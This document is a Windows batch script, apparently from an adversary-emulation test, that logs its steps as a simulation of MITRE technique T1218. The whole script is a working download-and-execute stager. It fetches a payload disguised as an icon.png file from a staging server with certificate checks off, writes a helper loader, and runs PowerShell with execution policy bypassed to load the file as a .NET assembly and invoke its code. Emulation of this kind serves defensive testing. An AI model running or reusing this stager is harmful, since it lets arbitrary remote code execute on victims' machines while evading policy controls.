@echo off
SETLOCAL EnableDelayedExpansion

REM ===== PLACEHOLDER CONSTANTS (random-named SET variables) =====
SET akjwne=%APPDATA%\11125\31f9c5b8
SET mznqwo=d697c48f.txt
SET xbcdrt=https://10.0.0.49/stage/2/icon.png?11125-7
SET jklmno=ITZEL-S2B
SET pqrstu=11125
SET uvwxyz=7
SET bcdefg=%PUBLIC%\\macula-simulations.log
REM (UNI_NET_EXEC not provided as PHR_ variable; using powershell.exe directly)

REM ===== CACHE TIMESTAMP ONCE =====
SET tsvar=!DATE!.!TIME!

REM ===== AUXILIARY FILE CREATION (CL_LoadAssembly.ps1) =====
REM This file is required by the LOLBIN invocation. It defines LoadAssemblyFromPath.
REM We create it in the output directory.
echo function LoadAssemblyFromPath {                                        > "!akjwne!\CL_LoadAssembly.ps1"
echo     param([string] $path)                                           >> "!akjwne!\CL_LoadAssembly.ps1"
echo     [System.Reflection.Assembly]::LoadFile($path)                   >> "!akjwne!\CL_LoadAssembly.ps1"
echo }                                                                   >> "!akjwne!\CL_LoadAssembly.ps1"
echo [!tsvar!][DEBUG][!jklmno!][!pqrstu!]: auxiliary_created               >> "!bcdefg!" 2>nul

REM ===== HEARTBEAT FETCH =====
echo [!tsvar!][DEBUG][!jklmno!][!pqrstu!]: heartbeat_start                 >> "!bcdefg!" 2>nul
curl -k -s -o "!akjwne!\!mznqwo!" "!xbcdrt!"
IF %ERRORLEVEL% EQU 0 (
    echo [!tsvar!][DEBUG][!jklmno!][!pqrstu!]: heartbeat_complete=0    >> "!bcdefg!" 2>nul
) ELSE (
    echo [!tsvar!][DEBUG][!jklmno!][!pqrstu!]: heartbeat_complete=1    >> "!bcdefg!" 2>nul
    REM Do not exit; let script continue to attempt invocation anyway
)

REM ===== CHANGE DIRECTORY TO OUTPUT DIR =====
echo [!tsvar!][DEBUG][!jklmno!][!pqrstu!]: chdir_start                    >> "!bcdefg!" 2>nul
cd /d "!akjwne!" >nul 2>&1
IF %ERRORLEVEL% EQU 0 (
    echo [!tsvar!][DEBUG][!jklmno!][!pqrstu!]: chdir_result=0           >> "!bcdefg!" 2>nul
) ELSE (
    echo [!tsvar!][DEBUG][!jklmno!][!pqrstu!]: chdir_result=1           >> "!bcdefg!" 2>nul
)

REM ===== LOLBIN INVOCATION VIA POWERSHELL =====
echo [!tsvar!][DEBUG][!jklmno!][!pqrstu!]: powershell_start                >> "!bcdefg!" 2>nul
SET _cla=CL_LoadAssembly.ps1
powershell.exe -nop -ep bypass -command "sl '!akjwne!'; ipmo ('.\'+$Env:_cla); $n=[AppDomain]::CurrentDomain.GetAssemblies().Count; LoadAssemblyFromPath '%APPDATA%\11125\31f9c5b8\d697c48f.txt'; $asm=([AppDomain]::CurrentDomain.GetAssemblies() | Select-Object -Skip $n -First 1); ($asm.GetExportedTypes() | ForEach-Object { $_.GetMethods([Reflection.BindingFlags]'Public,Static') | Where-Object { $_.GetParameters().Count -eq 0 } } | Select-Object -First 1).Invoke($null,$null)"
SET EXECRESULT=%ERRORLEVEL%

REM ===== POST-INVOCATION LOGGING =====
IF %EXECRESULT% EQU 0 (
    echo [!tsvar!][TTP][!jklmno!][!pqrstu!]: T1218^|System Binary Proxy Execution=OK^|   >> "!bcdefg!" 2>nul
    echo [!tsvar!][DEBUG][!jklmno!][!pqrstu!]: runDLL32result=0            >> "!bcdefg!" 2>nul
) ELSE (
    echo [!tsvar!][TTP][!jklmno!][!pqrstu!]: T1218^|System Binary Proxy Execution=FAIL^|powershell returned errorlevel %EXECRESULT% >> "!bcdefg!" 2>nul
    echo [!tsvar!][DEBUG][!jklmno!][!pqrstu!]: runDLL32result=1            >> "!bcdefg!" 2>nul
)

ENDLOCAL